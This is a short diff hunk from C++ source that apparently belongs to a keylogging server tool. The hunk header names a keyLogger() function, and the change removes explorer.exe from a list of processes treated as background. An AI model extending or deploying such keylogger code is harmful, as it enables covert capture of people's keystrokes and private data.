@@ -408,7 +408,7 @@ void Server::keyLogger() {
 
 bool Server::isBackgroundProcess(const wchar_t* processName) {
     std::vector<std::wstring> backgroundProcesses{
-        L"explorer.exe", L"TextInputHost.exe", L"SystemSettings.exe",
+        L"TextInputHost.exe", L"SystemSettings.exe",
         L"powershell.exe", L"ApplicationFrameHost.exe"
     };
 
